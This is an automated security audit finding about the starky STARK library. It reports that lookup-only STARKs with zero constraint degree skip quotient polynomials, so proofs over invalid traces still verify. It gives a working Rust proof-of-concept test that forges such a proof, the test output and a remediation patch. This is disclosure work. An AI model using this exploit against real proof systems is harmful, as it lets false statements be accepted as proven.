# Audited by [V12](https://v12.sh/)

The only autonomous auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.

# Lookup Constraints Lose Quotients
**#79438**
- Severity: Critical
- Validity: Unreviewed

## Source locations

### `starky/src/stark.rs`
#### Lines 83-98 — _Default quotient count derives entirely from `constraint_degree` and `config.num_challenges`._

```
    /// Outputs the maximum constraint degree of this [`Stark`].
    fn constraint_degree(&self) -> usize;

    /// Outputs the maximum quotient polynomial's degree factor of this [`Stark`].
    fn quotient_degree_factor(&self) -> usize {
        match self.constraint_degree().checked_sub(1) {
            Some(v) => 1.max(v),
            None => 0,
        }
    }

    /// Outputs the number of quotient polynomials this [`Stark`] would require with
    /// the provided [`StarkConfig`]
    fn num_quotient_polys(&self, config: &StarkConfig) -> usize {
        self.quotient_degree_factor() * config.num_challenges
    }
```

### `starky/src/permutation_stark.rs`
#### Lines 67-78 — _In-repo lookup-only STARK returns zero constraint degree while declaring a lookup._

```
    fn constraint_degree(&self) -> usize {
        0
    }

    fn lookups(&self) -> Vec<Lookup<F>> {
        vec![Lookup {
            columns: vec![Column::single(0)],
            table_column: Column::single(1),
            frequencies_column: Column::single(2),
            filter_columns: vec![Default::default()],
        }]
    }
```

### `starky/src/prover.rs` (2 locations)
#### Lines 371-388 — _Quotient computation is the path that should enforce evaluated constraints._

```
    let quotient_polys = timed!(
        timing,
        "compute quotient polys",
        compute_quotient_polys::<F, <F as Packable>::Packing, C, S, D>(
            stark,
            trace_commitment,
            &auxiliary_polys_commitment,
            lookup_challenges.as_ref(),
            &lookups,
            ctl_data,
            public_inputs,
            alphas.clone(),
            degree_bits,
            num_lookup_columns,
            &num_ctl_polys,
            config,
        )?
    );
```

⋯
#### Lines 507-509 — _All quotient polynomial generation is skipped when `quotient_degree_factor` is zero._

```
    if stark.quotient_degree_factor() == 0 {
        return Ok(None);
    }
```

### `starky/src/lookup.rs`
#### Lines 804-860 — _Lookup argument constraints are emitted through the same `ConstraintConsumer`._

```
pub(crate) fn eval_packed_lookups_generic<F, FE, P, S, const D: usize, const D2: usize>(
    stark: &S,
    lookups: &[Lookup<F>],
    vars: &S::EvaluationFrame<FE, P, D2>,
    lookup_vars: LookupCheckVars<F, FE, P, D2>,
    yield_constr: &mut ConstraintConsumer<P>,
) where
    F: RichField + Extendable<D>,
    FE: FieldExtension<D2, BaseField = F>,
    P: PackedField<Scalar = FE>,
    S: Stark<F, D>,
{
    let local_values = vars.get_local_values();
    let next_values = vars.get_next_values();
    let degree = stark.constraint_degree();
    let mut start = 0;
    for lookup in lookups {
        let num_helper_columns = lookup.num_helper_columns(degree);
        for &challenge in &lookup_vars.challenges {
            let grand_challenge = GrandProductChallenge {
                beta: F::ONE,
                gamma: challenge,
            };
            let lookup_columns = lookup
                .columns
                .iter()
                .map(|col| vec![col.eval_with_next(local_values, next_values)])
                .collect::<Vec<Vec<P>>>();

            // For each chunk, check that `h_i (x+f_2i) (x+f_{2i+1}) = (x+f_2i) * filter_{2i+1} + (x+f_{2i+1}) * filter_2i`
            // if the chunk has length 2 or if it has length 1, check that `h_i * (x+f_2i) = filter_2i`, where x is the challenge
            eval_helper_columns(
                &lookup.filter_columns,
                &lookup_columns,
                local_values,
                next_values,
                &lookup_vars.local_values[start..start + num_helper_columns - 1],
                degree,
                &grand_challenge,
                yield_constr,
            );

            let challenge = FE::from_basefield(challenge);

            // Check the `Z` polynomial.
            let z = lookup_vars.local_values[start + num_helper_columns - 1];
            let next_z = lookup_vars.next_values[start + num_helper_columns - 1];
            let table_with_challenge = lookup.table_column.eval(local_values) + challenge;
            let y = lookup_vars.local_values[start..start + num_helper_columns - 1]
                .iter()
                .fold(P::ZEROS, |acc, x| acc + *x)
                * table_with_challenge
                - lookup.frequencies_column.eval(local_values);
            // Check that in the first row, z = 0;
            yield_constr.constraint_first_row(z);
            yield_constr.constraint((next_z - z) * table_with_challenge - y);
            start += num_helper_columns;
```

### `starky/src/verifier.rs` (2 locations)
#### Lines 159-187 — _Verifier evaluates constraints but only checks them through supplied quotient polynomial chunks._

```
    eval_vanishing_poly::<F, F::Extension, F::Extension, S, D, D>(
        stark,
        &vars,
        &lookups,
        lookup_vars,
        ctl_vars,
        &mut consumer,
    );
    let vanishing_polys_zeta = consumer.accumulators();

    // Check each polynomial identity, of the form `vanishing(x) = Z_H(x) quotient(x)`, at zeta.
    let zeta_pow_deg = challenges.stark_zeta.exp_power_of_2(degree_bits);
    let z_h_zeta = zeta_pow_deg - F::Extension::ONE;
    // `quotient_polys_zeta` holds `num_challenges * quotient_degree_factor` evaluations.
    // Each chunk of `quotient_degree_factor` holds the evaluations of `t_0(zeta),...,t_{quotient_degree_factor-1}(zeta)`
    // where the "real" quotient polynomial is `t(X) = t_0(X) + t_1(X)*X^n + t_2(X)*X^{2n} + ...`.
    // So to reconstruct `t(zeta)` we can compute `reduce_with_powers(chunk, zeta^n)` for each
    // `quotient_degree_factor`-sized chunk of the original evaluations.

    for (i, chunk) in quotient_polys
        .iter()
        .flat_map(|x| x.chunks(stark.quotient_degree_factor()))
        .enumerate()
    {
        ensure!(
            vanishing_polys_zeta[i] == z_h_zeta * reduce_with_powers(chunk, zeta_pow_deg),
            "Mismatch between evaluation and opening of quotient polynomial"
        );
    }
```

⋯
#### Lines 267-271 — _Verifier accepts absent quotient openings when the expected quotient count is zero._

```
    ensure!(if let Some(quotient_polys) = quotient_polys {
        quotient_polys.len() == stark.num_quotient_polys(config)
    } else {
        stark.num_quotient_polys(config) == 0
    });
```

## Description

`compute_quotient_polys` suppresses the entire quotient commitment whenever `stark.quotient_degree_factor() == 0`, but lookup constraints are emitted independently of the base STARK transition constraints. `Stark::quotient_degree_factor` derives zero directly from `constraint_degree() == 0`, and the crate's lookup-only `PermutationStark` example returns `constraint_degree() == 0` while still declaring a lookup. In that configuration, `eval_packed_lookups_generic` adds lookup helper and `Z` constraints to the same `ConstraintConsumer`, but no quotient polynomials are produced or opened. Verification then accepts the absence of quotient openings because `num_quotient_polys(config)` is zero, and its quotient-identity loop has nothing to check. The pre-quotient dummy binding still runs, but it only binds the transcript to constraint expressions and does not enforce the actual trace openings without a quotient identity.

## Root cause

Quotient polynomial generation is gated only on the base STARK `constraint_degree`, while lookup and CTL constraints share the same quotient enforcement path. A zero base constraint degree incorrectly disables quotient enforcement for non-base constraints.

## Impact

Lookup-only STARKs can accept proofs whose trace columns do not satisfy the declared lookup or permutation argument. Any downstream statement that relies on lookups as its only constraint mechanism can be proven falsely.

## Proof of concept

### Test case

```
use std::marker::PhantomData;

use anyhow::Result;
use plonky2::field::extension::{Extendable, FieldExtension};
use plonky2::field::packed::PackedField;
use plonky2::field::polynomial::PolynomialValues;
use plonky2::field::types::Field;
use plonky2::hash::hash_types::RichField;
use plonky2::iop::ext_target::ExtensionTarget;
use plonky2::plonk::circuit_builder::CircuitBuilder;
use plonky2::plonk::config::{GenericConfig, PoseidonGoldilocksConfig};
use plonky2::util::timing::TimingTree;
use starky::config::StarkConfig;
use starky::constraint_consumer::{ConstraintConsumer, RecursiveConstraintConsumer};
use starky::evaluation_frame::StarkFrame;
use starky::lookup::{Column, Lookup};
use starky::prover::prove;
use starky::stark::Stark;
use starky::util::trace_rows_to_poly_values;
use starky::verifier::verify_stark_proof;

#[derive(Copy, Clone)]
struct LookupOnlyStark<F: RichField + Extendable<D>, const D: usize> {
    num_rows: usize,
    _phantom: PhantomData<F>,
}

impl<F: RichField + Extendable<D>, const D: usize> LookupOnlyStark<F, D> {
    const fn new(num_rows: usize) -> Self {
        Self {
            num_rows,
            _phantom: PhantomData,
        }
    }

    fn invalid_trace(&self) -> Vec<PolynomialValues<F>> {
        let mut rows = Vec::with_capacity(self.num_rows);
        for i in 0..self.num_rows {
            rows.push([
                F::from_canonical_usize(i),
                F::from_canonical_usize(i + self.num_rows),
                F::ONE,
            ]);
        }
        trace_rows_to_poly_values(rows)
    }
}

const COLUMNS: usize = 3;
const PUBLIC_INPUTS: usize = 0;

impl<F: RichField + Extendable<D>, const D: usize> Stark<F, D> for LookupOnlyStark<F, D> {
    type EvaluationFrame<FE, P, const D2: usize> = StarkFrame<P, P::Scalar, COLUMNS, PUBLIC_INPUTS>
    where
        FE: FieldExtension<D2, BaseField = F>,
        P: PackedField<Scalar = FE>;

    type EvaluationFrameTarget =
        StarkFrame<ExtensionTarget<D>, ExtensionTarget<D>, COLUMNS, PUBLIC_INPUTS>;

    fn constraint_degree(&self) -> usize {
        0
    }

    fn lookups(&self) -> Vec<Lookup<F>> {
        vec![Lookup {
            columns: vec![Column::single(0)],
            table_column: Column::single(1),
            frequencies_column: Column::single(2),
            filter_columns: vec![Default::default()],
        }]
    }

    fn eval_packed_generic<FE, P, const D2: usize>(
        &self,
        _vars: &Self::EvaluationFrame<FE, P, D2>,
        _yield_constr: &mut ConstraintConsumer<P>,
    ) where
        FE: FieldExtension<D2, BaseField = F>,
        P: PackedField<Scalar = FE>,
    {
    }

    fn eval_ext_circuit(
        &self,
        _builder: &mut CircuitBuilder<F, D>,
        _vars: &Self::EvaluationFrameTarget,
        _yield_constr: &mut RecursiveConstraintConsumer<F, D>,
    ) {
    }
}

#[test]
fn invalid_lookup_only_trace_still_proves_and_verifies() -> Result<()> {
    const D: usize = 2;
    type C = PoseidonGoldilocksConfig;
    type F = <C as GenericConfig<D>>::F;

    let config = StarkConfig::standard_fast_config();
    let stark = LookupOnlyStark::<F, D>::new(1 << 5);
    let trace = stark.invalid_trace();

    let col0 = &trace[0].values;
    let col1 = &trace[1].values;
    assert!(col0.iter().all(|v| !col1.contains(v)), "test setup must violate the lookup relation");
    assert_eq!(stark.quotient_degree_factor(), 0, "test setup must hit the vulnerable zero-quotient path");
    assert_eq!(stark.num_quotient_polys(&config), 0, "verifier must accept missing quotient openings");

    let proof = prove::<F, C, _, D>(stark, &config, trace, &[], None, &mut TimingTree::default())?;

    assert!(proof.proof.auxiliary_polys_cap.is_some(), "lookup auxiliary columns should still be committed");
    assert!(proof.proof.openings.auxiliary_polys.is_some(), "lookup openings should still be present");
    assert!(proof.proof.quotient_polys_cap.is_none(), "no quotient commitment should be produced on the vulnerable path");
    assert!(proof.proof.openings.quotient_polys.is_none(), "no quotient openings should be produced on the vulnerable path");

    verify_stark_proof(stark, proof, &config, None)?;
    Ok(())
}
```

### Extra files
- `starky/tests/lookup_constraints_lose_quotients.rs`

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cargo build --tests
```

### Output

```
running 1 test
test invalid_lookup_only_trace_still_proves_and_verifies ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.04s

warning: specialization is experimental
  --> field/src/packable.rs:13:5
   |
13 |     default type Packing = Self;
   |     ^^^^^^^
   |
   = note: see issue #31844 <https://github.com/rust-lang/rust/issues/31844> for more information
   = warning: unstable syntax can change at any point in the future, causing a hard error!
   = note: for more information, see issue #154045 <https://github.com/rust-lang/rust/issues/154045>

warning: specialization is experimental
   --> field/src/extension/quadratic.rs:190:5
    |
190 |     default fn mul(self, rhs: Self) -> Self {
    |     ^^^^^^^
    |
    = note: see issue #31844 <https://github.com/rust-lang/rust/issues/31844> for more information
    = warning: unstable syntax can change at any point in the future, causing a hard error!
    = note: for more information, see issue #154045 <https://github.com/rust-lang/rust/issues/154045>

warning: specialization is experimental
   --> field/src/extension/quartic.rs:214:5
    |
214 |     default fn mul(self, rhs: Self) -> Self {
    |     ^^^^^^^
    |
    = note: see issue #31844 <https://github.com/rust-lang/rust/issues/31844> for more information
    = warning: unstable syntax can change at any point in the future, causing a hard error!
    = note: for more information, see issue #154045 <https://github.com/rust-lang/rust/issues/154045>

warning: specialization is experimental
   --> field/src/extension/quintic.rs:223:5
    |
223 |     default fn mul(self, rhs: Self) -> Self {
    |     ^^^^^^^
    |
    = note: see issue #31844 <https://github.com/rust-lang/rust/issues/31844> for more information
    = warning: unstable syntax can change at any point in the future, causing a hard error!
    = note: for more information, see issue #154045 <https://github.com/rust-lang/rust/issues/154045>

warning: specialization is experimental
 --> field/src/ops.rs:9:5
  |
9 |     default fn square(&self) -> Self {
  |     ^^^^^^^
  |
  = note: see issue #31844 <https://github.com/rust-lang/rust/issues/31844> for more information
  = warning: unstable syntax can change at any point in the future, causing a hard error!
  = note: for more information, see issue #154045 <https://github.com/rust-lang/rust/issues/154045>

warning: `qp-plonky2-field` (lib) generated 5 warnings
   Compiling starky v1.4.1 (/repo/starky)
warning: unused import: `plonky2::field::types::Field`
 --> starky/tests/lookup_constraints_lose_quotients.rs:7:5
  |
7 | use plonky2::field::types::Field;
  |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |
  = note: `#[warn(unused_imports)]` (part of `#[warn(unused)]`) on by default

warning: `starky` (test "lookup_constraints_lose_quotients") generated 1 warning
    Finished `release` profile [optimized] target(s) in 8.05s
     Running tests/lookup_constraints_lose_quotients.rs (target/release/deps/lookup_constraints_lose_quotients-8af3456cc8d4bd2b)
```

### Considerations

Validated with `cargo test --release --manifest-path starky/Cargo.toml --test lookup_constraints_lose_quotients -- --nocapture`. The PoC recreates the repo’s lookup-only `PermutationStark` pattern inside `starky/tests/lookup_constraints_lose_quotients.rs` because the in-repo example module is `#[cfg(test)]` and not importable from an external integration test. The exploit path depends on release-mode execution; debug builds hit the prover’s `#[cfg(debug_assertions)] check_constraints` self-check before proof generation.

## Remediation

### Explanation

Enable quotient generation whenever a STARK has lookup or CTL constraints even if base constraint_degree() is zero, and align recursive verifier quotient target allocation with num_quotient_polys(config) so lookup-only proofs must include quotient commitments/openings and be checked.

### Patch

```diff
diff --git a/starky/src/stark.rs b/starky/src/stark.rs
--- a/starky/src/stark.rs
+++ b/starky/src/stark.rs
@@ -1,299 +1,299 @@
 //! Implementation of the [`Stark`] trait that defines the set of constraints
 //! related to a statement.
 
 #[cfg(not(feature = "std"))]
 use alloc::{vec, vec::Vec};
 
 use plonky2::field::extension::{Extendable, FieldExtension};
 use plonky2::field::packed::PackedField;
 use plonky2::field::types::Field;
 use plonky2::fri::structure::{
     FriBatchInfo, FriBatchInfoTarget, FriInstanceInfo, FriInstanceInfoTarget, FriOpeningExpression,
     FriOracleInfo, FriPolynomialInfo,
 };
 use plonky2::hash::hash_types::RichField;
 use plonky2::iop::ext_target::ExtensionTarget;
 use plonky2::iop::target::Target;
 use plonky2::plonk::circuit_builder::CircuitBuilder;
 
 use crate::config::StarkConfig;
 use crate::constraint_consumer::{ConstraintConsumer, RecursiveConstraintConsumer};
 use crate::evaluation_frame::StarkEvaluationFrame;
 use crate::lookup::Lookup;
 
 /// Represents a STARK system.
 pub trait Stark<F: RichField + Extendable<D>, const D: usize>: Sync {
     /// The total number of columns in the trace.
     const COLUMNS: usize = Self::EvaluationFrameTarget::COLUMNS;
     /// The total number of public inputs.
     const PUBLIC_INPUTS: usize = Self::EvaluationFrameTarget::PUBLIC_INPUTS;
 
     /// This is used to evaluate constraints natively.
     type EvaluationFrame<FE, P, const D2: usize>: StarkEvaluationFrame<P, FE>
     where
         FE: FieldExtension<D2, BaseField = F>,
         P: PackedField<Scalar = FE>;
 
     /// The `Target` version of `Self::EvaluationFrame`, used to evaluate constraints recursively.
     type EvaluationFrameTarget: StarkEvaluationFrame<ExtensionTarget<D>, ExtensionTarget<D>>;
 
     /// Evaluates constraints at a vector of points.
     ///
     /// The points are elements of a field `FE`, a degree `D2` extension of `F`. This lets us
     /// evaluate constraints over a larger domain if desired. This can also be called with `FE = F`
     /// and `D2 = 1`, in which case we are using the trivial extension, i.e. just evaluating
     /// constraints over `F`.
     fn eval_packed_generic<FE, P, const D2: usize>(
         &self,
         vars: &Self::EvaluationFrame<FE, P, D2>,
         yield_constr: &mut ConstraintConsumer<P>,
     ) where
         FE: FieldExtension<D2, BaseField = F>,
         P: PackedField<Scalar = FE>;
 
     /// Evaluates constraints at a vector of points from the base field `F`.
     fn eval_packed_base<P: PackedField<Scalar = F>>(
         &self,
         vars: &Self::EvaluationFrame<F, P, 1>,
         yield_constr: &mut ConstraintConsumer<P>,
     ) {
         self.eval_packed_generic(vars, yield_constr)
     }
 
     /// Evaluates constraints at a single point from the degree `D` extension field.
     fn eval_ext(
         &self,
         vars: &Self::EvaluationFrame<F::Extension, F::Extension, D>,
         yield_constr: &mut ConstraintConsumer<F::Extension>,
     ) {
         self.eval_packed_generic(vars, yield_constr)
     }
 
     /// Evaluates constraints at a vector of points from the degree `D` extension field.
     /// This is like `eval_ext`, except in the context of a recursive circuit.
     /// Note: constraints must be added through`yield_constr.constraint(builder, constraint)`
     /// in the same order as they are given in `eval_packed_generic`.
     fn eval_ext_circuit(
         &self,
         builder: &mut CircuitBuilder<F, D>,
         vars: &Self::EvaluationFrameTarget,
         yield_constr: &mut RecursiveConstraintConsumer<F, D>,
     );
 
     /// Outputs the maximum constraint degree of this [`Stark`].
     fn constraint_degree(&self) -> usize;
 
     /// Outputs the maximum quotient polynomial's degree factor of this [`Stark`].
     fn quotient_degree_factor(&self) -> usize {
         match self.constraint_degree().checked_sub(1) {
             Some(v) => 1.max(v),
-            None => 0,
+            None => usize::from(self.uses_lookups() || self.requires_ctls()),
         }
     }
 
     /// Outputs the number of quotient polynomials this [`Stark`] would require with
     /// the provided [`StarkConfig`]
     fn num_quotient_polys(&self, config: &StarkConfig) -> usize {
         self.quotient_degree_factor() * config.num_challenges
     }
 
     /// Computes the FRI instance used to prove this Stark.
     fn fri_instance(
         &self,
         zeta: F::Extension,
         g: F,
         num_ctl_helpers: usize,
         num_ctl_zs: Vec<usize>,
         config: &StarkConfig,
     ) -> FriInstanceInfo<F, D> {
         let mut oracles = vec![];
         let trace_info = FriPolynomialInfo::from_range(oracles.len(), 0..Self::COLUMNS);
         oracles.push(FriOracleInfo {
             num_polys: Self::COLUMNS,
             blinding: false,
         });
 
         let num_lookup_columns = self.num_lookup_helper_columns(config);
         let num_auxiliary_polys = num_lookup_columns + num_ctl_helpers + num_ctl_zs.len();
         let auxiliary_polys_info = if self.uses_lookups() || self.requires_ctls() {
             let aux_polys = FriPolynomialInfo::from_range(oracles.len(), 0..num_auxiliary_polys);
             oracles.push(FriOracleInfo {
                 num_polys: num_auxiliary_polys,
                 blinding: false,
             });
             aux_polys
         } else {
             vec![]
         };
 
         let num_quotient_polys = self.num_quotient_polys(config);
         let quotient_info = if num_quotient_polys > 0 {
             let quotient_polys =
                 FriPolynomialInfo::from_range(oracles.len(), 0..num_quotient_polys);
             oracles.push(FriOracleInfo {
                 num_polys: num_quotient_polys,
                 blinding: false,
             });
             quotient_polys
         } else {
             vec![]
         };
 
         let zeta_batch = FriBatchInfo {
             point: zeta,
             openings: [
                 trace_info.clone(),
                 auxiliary_polys_info.clone(),
                 quotient_info,
             ]
             .concat()
             .into_iter()
             .map(FriOpeningExpression::raw)
             .collect(),
         };
         let zeta_next_batch = FriBatchInfo {
             point: zeta.scalar_mul(g),
             openings: [trace_info, auxiliary_polys_info]
                 .concat()
                 .into_iter()
                 .map(FriOpeningExpression::raw)
                 .collect(),
         };
 
         let mut batches = vec![zeta_batch, zeta_next_batch];
 
         if self.requires_ctls() {
             let ctl_zs_info = FriPolynomialInfo::from_range(
                 1, // auxiliary oracle index
                 num_lookup_columns + num_ctl_helpers..num_auxiliary_polys,
             );
             let ctl_first_batch = FriBatchInfo {
                 point: F::Extension::ONE,
                 openings: ctl_zs_info
                     .into_iter()
                     .map(FriOpeningExpression::raw)
                     .collect(),
             };
 
             batches.push(ctl_first_batch);
         }
 
         FriInstanceInfo { oracles, batches }
     }
 
     /// Computes the FRI instance used to prove this Stark.
     fn fri_instance_target(
         &self,
         builder: &mut CircuitBuilder<F, D>,
         zeta: ExtensionTarget<D>,
         g: Target,
         num_ctl_helper_polys: usize,
         num_ctl_zs: usize,
         config: &StarkConfig,
     ) -> FriInstanceInfoTarget<F, D> {
         let mut oracles = vec![];
         let trace_info = FriPolynomialInfo::from_range(oracles.len(), 0..Self::COLUMNS);
         oracles.push(FriOracleInfo {
             num_polys: Self::COLUMNS,
             blinding: false,
         });
 
         let num_lookup_columns = self.num_lookup_helper_columns(config);
         let num_auxiliary_polys = num_lookup_columns + num_ctl_helper_polys + num_ctl_zs;
         let auxiliary_polys_info = if self.uses_lookups() || self.requires_ctls() {
             let aux_polys = FriPolynomialInfo::from_range(oracles.len(), 0..num_auxiliary_polys);
             oracles.push(FriOracleInfo {
                 num_polys: num_auxiliary_polys,
                 blinding: false,
             });
             aux_polys
         } else {
             vec![]
         };
 
         let num_quotient_polys = self.num_quotient_polys(config);
         let quotient_info = if num_quotient_polys > 0 {
             let quotient_polys =
                 FriPolynomialInfo::from_range(oracles.len(), 0..num_quotient_polys);
             oracles.push(FriOracleInfo {
                 num_polys: num_quotient_polys,
                 blinding: false,
             });
             quotient_polys
         } else {
             vec![]
         };
 
         let zeta_batch = FriBatchInfoTarget {
             point: zeta,
             openings: [
                 trace_info.clone(),
                 auxiliary_polys_info.clone(),
                 quotient_info,
             ]
             .concat()
             .into_iter()
             .map(FriOpeningExpression::raw)
             .collect(),
         };
         let g_ext = builder.convert_to_ext(g);
         let zeta_next = builder.mul_extension(g_ext, zeta);
         let zeta_next_batch = FriBatchInfoTarget {
             point: zeta_next,
             openings: [trace_info, auxiliary_polys_info]
                 .concat()
                 .into_iter()
                 .map(FriOpeningExpression::raw)
                 .collect(),
         };
 
         let mut batches = vec![zeta_batch, zeta_next_batch];
 
         if self.requires_ctls() {
             let ctl_zs_info = FriPolynomialInfo::from_range(
                 1, // auxiliary oracle index
                 num_lookup_columns + num_ctl_helper_polys..num_auxiliary_polys,
             );
             let ctl_first_batch = FriBatchInfoTarget {
                 point: builder.one_extension(),
                 openings: ctl_zs_info
                     .into_iter()
                     .map(FriOpeningExpression::raw)
                     .collect(),
             };
 
             batches.push(ctl_first_batch);
         }
 
         FriInstanceInfoTarget { oracles, batches }
     }
 
     /// Outputs all the [`Lookup`] this STARK table needs to perform across its columns.
     fn lookups(&self) -> Vec<Lookup<F>> {
         vec![]
     }
 
     /// Outputs the number of total lookup helper columns, based on this STARK's vector
     /// of [`Lookup`] and the number of challenges used by this [`StarkConfig`].
     fn num_lookup_helper_columns(&self, config: &StarkConfig) -> usize {
         self.lookups()
             .iter()
             .map(|lookup| lookup.num_helper_columns(self.constraint_degree()))
             .sum::<usize>()
             * config.num_challenges
     }
 
     /// Indicates whether this STARK uses lookups over some of its columns, and as such requires
     /// additional steps during proof generation to handle auxiliary polynomials.
     fn uses_lookups(&self) -> bool {
         !self.lookups().is_empty()
     }
 
     /// Indicates whether this STARK belongs to a multi-STARK system, and as such may require
     /// cross-table lookups to connect shared values across different traces.
     ///
     /// It defaults to `false`, i.e. for simple uni-STARK systems.
     fn requires_ctls(&self) -> bool {
         false
     }
 }

diff --git a/starky/src/recursive_verifier.rs b/starky/src/recursive_verifier.rs
--- a/starky/src/recursive_verifier.rs
+++ b/starky/src/recursive_verifier.rs
@@ -1,404 +1,403 @@
 //! Implementation of the STARK recursive verifier, i.e. where proof
 //! verification if encoded in a plonky2 circuit.
 
 #[cfg(not(feature = "std"))]
 use alloc::vec::Vec;
 use core::iter::once;
 
 use anyhow::{ensure, Result};
 use itertools::Itertools;
 use plonky2::field::extension::Extendable;
 use plonky2::fri::witness_util::set_fri_proof_target;
 use plonky2::hash::hash_types::RichField;
 use plonky2::iop::challenger::RecursiveChallenger;
 use plonky2::iop::target::Target;
 use plonky2::iop::witness::WitnessWrite;
 use plonky2::plonk::circuit_builder::CircuitBuilder;
 use plonky2::plonk::config::{AlgebraicHasher, GenericConfig};
 use plonky2::util::reducing::ReducingFactorTarget;
 use plonky2::with_context;
 
 use crate::config::StarkConfig;
 use crate::cross_table_lookup::CtlCheckVarsTarget;
 use crate::proof::{
     StarkOpeningSetTarget, StarkProof, StarkProofChallengesTarget, StarkProofTarget,
     StarkProofWithPublicInputs, StarkProofWithPublicInputsTarget,
 };
 use crate::stark::Stark;
 use crate::vanishing_poly::compute_eval_vanishing_poly_circuit;
 
 /// Encodes the verification of a [`StarkProofWithPublicInputsTarget`]
 /// for some statement in a circuit.
 pub fn verify_stark_proof_circuit<
     F: RichField + Extendable<D>,
     C: GenericConfig<D, F = F>,
     S: Stark<F, D>,
     const D: usize,
 >(
     builder: &mut CircuitBuilder<F, D>,
     stark: S,
     proof_with_pis: StarkProofWithPublicInputsTarget<D>,
     inner_config: &StarkConfig,
     min_degree_bits_to_support: Option<usize>,
 ) where
     C::Hasher: AlgebraicHasher<F>,
 {
     assert_eq!(proof_with_pis.public_inputs.len(), S::PUBLIC_INPUTS);
     let max_degree_bits_to_support = proof_with_pis.proof.recover_degree_bits(inner_config);
 
     let mut challenger = RecursiveChallenger::<F, C::Hasher, D>::new(builder);
     let challenges = with_context!(
         builder,
         "compute challenges",
         proof_with_pis.get_challenges::<F, C, S>(
             &stark,
             builder,
             &mut challenger,
             None,
             None,
             max_degree_bits_to_support,
             false,
             inner_config
         )
     );
 
     verify_stark_proof_with_challenges_circuit::<F, C, S, D>(
         builder,
         &stark,
         &proof_with_pis.proof,
         &proof_with_pis.public_inputs,
         challenges,
         None,
         inner_config,
         max_degree_bits_to_support,
         min_degree_bits_to_support,
     );
 }
 
 /// Recursively verifies an inner STARK proof.
 pub fn verify_stark_proof_with_challenges_circuit<
     F: RichField + Extendable<D>,
     C: GenericConfig<D, F = F>,
     S: Stark<F, D>,
     const D: usize,
 >(
     builder: &mut CircuitBuilder<F, D>,
     stark: &S,
     proof: &StarkProofTarget<D>,
     public_inputs: &[Target],
     challenges: StarkProofChallengesTarget<D>,
     ctl_vars: Option<&[CtlCheckVarsTarget<F, D>]>,
     inner_config: &StarkConfig,
     degree_bits: usize,
     min_degree_bits_to_support: Option<usize>,
 ) where
     C::Hasher: AlgebraicHasher<F>,
 {
     check_lookup_options(stark, proof, &challenges).unwrap();
 
     let zero = builder.zero();
     let one = builder.one_extension();
     let two = builder.two();
 
     let num_ctl_polys = ctl_vars
         .map(|v| v.iter().map(|ctl| ctl.helper_columns.len()).sum::<usize>())
         .unwrap_or_default();
 
     // degree_bits should be nonzero.
     let _ = builder.inverse(proof.degree_bits);
 
     let quotient_polys = &proof.openings.quotient_polys;
     let ctl_zs_first = &proof.openings.ctl_zs_first;
 
     let max_num_of_bits_in_degree = degree_bits + 1;
     let degree = builder.exp(two, proof.degree_bits, max_num_of_bits_in_degree);
     let degree_bits_vec = builder.split_le(degree, max_num_of_bits_in_degree);
 
     let zeta_pow_deg = builder.exp_extension_from_bits(challenges.stark_zeta, &degree_bits_vec);
     let z_h_zeta = builder.sub_extension(zeta_pow_deg, one);
 
     // Calculate primitive_root_of_unity(degree_bits)
     let two_adicity = builder.constant(F::from_canonical_usize(F::TWO_ADICITY));
     let two_adicity_sub_degree_bits = builder.sub(two_adicity, proof.degree_bits);
     let two_exp_two_adicity_sub_degree_bits =
         builder.exp(two, two_adicity_sub_degree_bits, F::TWO_ADICITY);
     let base = builder.constant(F::POWER_OF_TWO_GENERATOR);
     let g = builder.exp(base, two_exp_two_adicity_sub_degree_bits, F::TWO_ADICITY);
 
     let num_lookup_columns = stark.num_lookup_helper_columns(inner_config);
     let lookup_challenges = stark.uses_lookups().then(|| {
         challenges
             .lookup_challenge_set
             .as_ref()
             .unwrap()
             .challenges
             .iter()
             .map(|ch| ch.beta)
             .collect::<Vec<_>>()
     });
 
     let vanishing_polys_zeta = compute_eval_vanishing_poly_circuit(
         builder,
         stark,
         &proof.openings,
         ctl_vars,
         lookup_challenges.as_ref(),
         public_inputs,
         challenges.stark_alphas,
         challenges.stark_zeta,
         degree_bits,
         proof.degree_bits,
         num_lookup_columns,
     );
     // Check each polynomial identity, of the form `vanishing(x) = Z_H(x) quotient(x)`, at zeta.
     let mut scale = ReducingFactorTarget::new(zeta_pow_deg);
     if let Some(quotient_polys) = quotient_polys {
         for (i, chunk) in quotient_polys
             .chunks(stark.quotient_degree_factor())
             .enumerate()
         {
             let recombined_quotient = scale.reduce(chunk, builder);
             let computed_vanishing_poly = builder.mul_extension(z_h_zeta, recombined_quotient);
             builder.connect_extension(vanishing_polys_zeta[i], computed_vanishing_poly);
         }
     }
 
     let merkle_caps = once(proof.trace_cap.clone())
         .chain(proof.auxiliary_polys_cap.clone())
         .chain(proof.quotient_polys_cap.clone())
         .collect_vec();
 
     let fri_instance = stark.fri_instance_target(
         builder,
         challenges.stark_zeta,
         g,
         num_ctl_polys,
         ctl_zs_first.as_ref().map_or(0, |c| c.len()),
         inner_config,
     );
 
     let one = builder.one();
     let degree_sub_one = builder.sub(degree, one);
     // Used to check if we want to skip a Fri query step.
     let degree_sub_one_bits_vec = builder.split_le(degree_sub_one, degree_bits);
 
     if let Some(min_degree_bits_to_support) = min_degree_bits_to_support {
         builder.verify_fri_proof_with_multiple_degree_bits::<C>(
             &fri_instance,
             &proof.openings.to_fri_openings(zero),
             &challenges.fri_challenges,
             &merkle_caps,
             &proof.opening_proof,
             &inner_config.fri_params(degree_bits),
             proof.degree_bits,
             &degree_sub_one_bits_vec,
             min_degree_bits_to_support,
         );
     } else {
         builder.verify_fri_proof::<C>(
             &fri_instance,
             &proof.openings.to_fri_openings(zero),
             &challenges.fri_challenges,
             &merkle_caps,
             &proof.opening_proof,
             &inner_config.fri_params(degree_bits),
         );
     }
 }
 
 /// Adds a new `StarkProofWithPublicInputsTarget` to this circuit.
 pub fn add_virtual_stark_proof_with_pis<
     F: RichField + Extendable<D>,
     S: Stark<F, D>,
     const D: usize,
 >(
     builder: &mut CircuitBuilder<F, D>,
     stark: &S,
     config: &StarkConfig,
     degree_bits: usize,
     num_ctl_helper_zs: usize,
     num_ctl_zs: usize,
 ) -> StarkProofWithPublicInputsTarget<D> {
